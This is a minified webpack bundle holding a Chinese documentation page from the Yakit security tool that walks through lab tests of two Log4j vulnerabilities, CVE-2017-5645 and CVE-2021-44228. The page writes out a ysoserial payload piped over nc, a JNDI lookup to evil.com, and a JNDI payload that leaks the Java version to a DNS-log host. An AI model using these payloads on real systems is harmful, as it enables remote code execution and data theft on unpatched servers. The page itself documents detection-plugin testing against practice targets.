(self.webpackChunkyaklang=self.webpackChunkyaklang||[]).push([[5405],{3905:(e,t,n)=>{"use strict";n.d(t,{Zo:()=>s,kt:()=>m});var r=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var c=r.createContext({}),p=function(e){var t=r.useContext(c),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},s=function(e){var t=p(e.components);return r.createElement(c.Provider,{value:t},e.children)},u="mdxType",g={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,o=e.mdxType,a=e.originalType,c=e.parentName,s=l(e,["components","mdxType","originalType","parentName"]),u=p(n),d=o,m=u["".concat(c,".").concat(d)]||u[d]||g[d]||a;return n?r.createElement(m,i(i({ref:t},s),{},{components:n})):r.createElement(m,i({ref:t},s))}));function m(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var a=n.length,i=new Array(a);i[0]=d;var l={};for(var c in t)hasOwnProperty.call(t,c)&&(l[c]=t[c]);l.originalType=e,l[u]="string"==typeof e?e:o,i[1]=l;for(var p=2;p<a;p++)i[p]=n[p];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},67560:(e,t,n)=>{"use strict";n.r(t),n.d(t,{frontMatter:()=>a,contentTitle:()=>i,metadata:()=>l,toc:()=>c,default:()=>s});var r=n(22122),o=(n(67294),n(3905));const a={sidebar_position:28},i="Log4j\u63d2\u4ef6\u4f7f\u7528",l={unversionedId:"DetectionPlug-in/Log4j",id:"DetectionPlug-in/Log4j",isDocsHomePage:!1,title:"Log4j\u63d2\u4ef6\u4f7f\u7528",description:"1 CVE-2017-5645 \u53cd\u5e8f\u5217\u5316\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e",source:"@site/wiki/DetectionPlug-in/Log4j.md",sourceDirName:"DetectionPlug-in",slug:"/DetectionPlug-in/Log4j",permalink:"/wiki/DetectionPlug-in/Log4j",tags:[],version:"current",sidebarPosition:28,frontMatter:{sidebar_position:28},sidebar:"teamSidebar",previous:{title:"Metinfo\u63d2\u4ef6\u4f7f\u7528",permalink:"/wiki/DetectionPlug-in/Metinfo"},next:{title:"Goahead\u63d2\u4ef6\u4f7f\u7528",permalink:"/wiki/DetectionPlug-in/Goahead"}},c=[{value:"1 CVE-2017-5645 \u53cd\u5e8f\u5217\u5316\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e",id:"1-cve-2017-5645-\u53cd\u5e8f\u5217\u5316\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e",children:[]},{value:"2 CVE-2021-44228 JNDI \u6ce8\u5165\u6f0f\u6d1e",id:"2-cve-2021-44228-jndi-\u6ce8\u5165\u6f0f\u6d1e",children:[]}],p={toc:c};function s(e){let{components:t,...a}=e;return(0,o.kt)("wrapper",(0,r.Z)({},p,a,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"log4j\u63d2\u4ef6\u4f7f\u7528"},"Log4j\u63d2\u4ef6\u4f7f\u7528"),(0,o.kt)("h2",{id:"1-cve-2017-5645-\u53cd\u5e8f\u5217\u5316\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},"1 CVE-2017-5645 \u53cd\u5e8f\u5217\u5316\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"\u63d2\u4ef6id\uff1a")),(0,o.kt)("p",null,"Yakit\u6b63\u5728\u52aa\u529b\u7f16\u5199~"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"\u6f0f\u6d1e\u63cf\u8ff0\uff1a")),(0,o.kt)("p",null,"Apache Log4j\u662f\u4e00\u4e2a\u7528\u4e8eJava\u7684\u65e5\u5fd7\u8bb0\u5f55\u5e93\uff0c\u5176\u652f\u6301\u542f\u52a8\u8fdc\u7a0b\u65e5\u5fd7\u670d\u52a1\u5668\u3002Apache Log4j 2.8.2\u4e4b\u524d\u76842.x\u7248\u672c\u4e2d\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"\u6d4b\u8bd5\u8fc7\u7a0b\uff1a")),(0,o.kt)("p",null,"\u4f7f\u7528vulhub\u9776\u573a\uff0c\u57288712\u7aef\u53e3\u5f00\u542ftcp\u670d\u52a1"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(35596).Z})),(0,o.kt)("p",null,"\u4f7f\u7528ysoserial\u751f\u6210payload\uff0c\u7136\u540e\u76f4\u63a5\u53d1\u9001\u7ed98712\u7aef\u53e3"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-go"},'java -jar ysoserial-master-v0.0.5-gb617b7b-16.jar CommonsCollections5 "touch /tmp/success" | nc your-ip port\n')),(0,o.kt)("p",null,"\u6267\u884cdocker-compose exec log4j bash\u8fdb\u5165\u5bb9\u5668\uff0c\u53ef\u89c1 /tmp/success \u5df2\u6210\u529f\u521b\u5efa"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(5782).Z})),(0,o.kt)("h2",{id:"2-cve-2021-44228-jndi-\u6ce8\u5165\u6f0f\u6d1e"},"2 CVE-2021-44228 JNDI \u6ce8\u5165\u6f0f\u6d1e"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"\u63d2\u4ef6id\uff1a")),(0,o.kt)("p",null,"Yakit\u6b63\u5728\u52aa\u529b\u7f16\u5199~"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"\u6f0f\u6d1e\u63cf\u8ff0\uff1a")),(0,o.kt)("p",null,"Apache Log4j 2 \u662fJava\u8bed\u8a00\u7684\u65e5\u5fd7\u5904\u7406\u5957\u4ef6\uff0c\u4f7f\u7528\u6781\u4e3a\u5e7f\u6cdb\u3002\u5728\u51762.0\u52302.14.1\u7248\u672c\u4e2d\u5b58\u5728\u4e00\u5904JNDI\u6ce8\u5165\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u5728\u53ef\u4ee5\u63a7\u5236\u65e5\u5fd7\u5185\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u901a\u8fc7\u4f20\u5165\u7c7b\u4f3c\u4e8e${jndi:ldap://evil.com/example}\u7684lookup\u7528\u4e8e\u8fdb\u884cJNDI\u6ce8\u5165\uff0c\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"\u6d4b\u8bd5\u8fc7\u7a0b\uff1a")),(0,o.kt)("p",null,"\u8bbf\u95eevulfocus\u9776\u573a"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(95030).Z})),(0,o.kt)("p",null,"\u5f00\u542flog4j2\u88ab\u52a8\u626b\u63cf\u63d2\u4ef6\u5e76\u5237\u65b0\u9875\u9762\u6d41\u91cf\uff0c\u53d1\u73b0\u5728Accept\u53c2\u6570\u5904\u6709\u6f0f\u6d1e"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(97643).Z})),(0,o.kt)("p",null,"\u518d\u53d1\u9001payload:${jndi:ldap://${sys:java.version}.rowkazpvsx.dnstunnel.run}\uff0c\u5728dnslog\u6536\u5230\u547d\u4ee4\u6267\u884c\u7ed3\u679c"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(56704).Z})))}s.isMDXComponent=!0},35596:(e,t,n)=>{"use strict";n.d(t,{Z:()=>r});const r=n.p+"assets/images/Log4j-1-0189b3b4a28ea7c7a33fc37fa81d1a4e.png"},5782:(e,t,n)=>{"use strict";n.d(t,{Z:()=>r});const r=n.p+"assets/images/Log4j-3-e4cc57ce1beb89486efb84de519863ce.png"},95030:(e,t,n)=>{"use strict";n.d(t,{Z:()=>r});const r=n.p+"assets/images/Log4j-4-9d940dd0596aca623c30846f3157e13a.png"},97643:(e,t,n)=>{"use strict";n.d(t,{Z:()=>r});const r=n.p+"assets/images/Log4j-5-7dd5152a2b55ebb4f8b24bf77721ee87.png"},56704:(e,t,n)=>{"use strict";n.d(t,{Z:()=>r});const r=n.p+"assets/images/Log4j-6-20f30b132a1c067b46c5b04469037a7b.png"}}]);